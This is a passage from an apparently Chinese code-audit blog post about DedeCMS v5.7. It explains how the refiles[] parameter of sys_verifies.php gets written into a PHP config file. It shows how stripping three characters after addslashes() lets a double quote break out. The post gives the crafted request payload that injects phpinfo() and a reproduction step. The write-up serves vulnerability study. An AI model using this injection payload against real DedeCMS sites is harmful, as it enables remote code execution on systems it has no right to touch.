+<pre tabindex="0"><code>/dede/sys_verifies.php?action=getfiles&amp;refiles[]=123456789
+</code></pre><p><code>/data/sys_verifies.php</code> 152行</p>
+<!-- raw HTML omitted -->
+<p>控制$refiles 写入 modifytmp.inc 配置文件</p>
+<p>$refiles数组赋值给$filename  , 对$filename去掉前三位，奇怪的操作</p>
+<p>上面操作后modifytmp.inc结果是</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$tmpdir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;291d8d6df1f80c19&#34;</span>;
+</span></span><span style="display:flex;"><span>$files[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;456789&#34;</span>;
+</span></span><span style="display:flex;"><span>$fileConut <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>456789这里的值是可控的，试想去实现闭合双引号 继而完成代码的注入</p>
+<p>dedecms对于输入是全局过滤的，在<code>common.inc.php</code>中注册并过滤了外部提交的变量</p>
+<p>这是构造的参数</p>
+<pre tabindex="0"><code>/dede/sys_verifies.php?action=getfiles&amp;refiles[]=\&#34;;phpinfo();die();//
+</code></pre><!-- raw HTML omitted -->
+<p>经过<code>common.inc.php</code> 中对参数的<code> addslashes()</code> 发现一个斜杠和双引号成功转义出来了三个斜杠在前三位</p>
+<p>正好可以 让这里去除前三位斜杠</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($filename,<span style="color:#ae81ff">3</span>,<span style="color:#a6e22e">strlen</span>($filename)<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>);
+</span></span></code></pre></div><p>留下&quot; 来进行闭合 ，这样我们就绕过了转义对&quot;的影响</p>
+<p>相同的原理</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">/</span><span style="color:#a6e22e">dede</span><span style="color:#f92672">/</span><span style="color:#a6e22e">sys_verifies</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span><span style="color:#f92672">?</span><span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#a6e22e">getfiles</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">refiles</span>[]<span style="color:#f92672">=</span><span style="color:#ae81ff">12</span><span style="color:#e6db74">&#34;;phpinfo();// 
+</span></span></span></code></pre></div><p>这样构造更直观，转义后得到的参数是 <code>12/&quot;;phpinfo();die();// </code></p>
+<p>去掉前三位是 <code>&quot;;phpinfo();die();//</code></p>
+<p>好现在把最终的值填入配置文件，得到</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$tmpdir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;291d8d6df1f80c19&#34;</span>;
+</span></span><span style="display:flex;"><span>$files[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;<span style="color:#a6e22e">phpinfo</span>();<span style="color:#75715e">//&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$fileConut <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>成功闭合了双引号 ，也注释了后面的双引号</p>
+<h3 id="漏洞复现-1">漏洞复现</h3>
+<pre tabindex="0"><code>/dede/sys_verifies.php?action=getfiles&amp;refiles[]=12&#34;;phpinfo();// 
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308012328632.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308012328632.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308012328632.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308012328632.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308012328632.png"
+        title="image-20230801232836570" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dedecms-v5.7/" data-title="代码审计-DedeCMS v5.7" data-hashtags="php"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dedecms-v5.7/" data-hashtag="php"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dedecms-v5.7/" data-title="代码审计-DedeCMS v5.7"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dedecms-v5.7/" data-title="代码审计-DedeCMS v5.7"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dedecms-v5.7/" data-title="代码审计-DedeCMS v5.7"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/php/">Php</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E7%86%8A%E6%B5%B7cms_v1.0/" class="prev" rel="prev" title="代码审计-熊海cms_V1.0"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>代码审计-熊海cms_V1.0</a>
+            <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BA%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/" class="next" rel="next" title="burpsuite靶场身份验证">burpsuite靶场身份验证<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
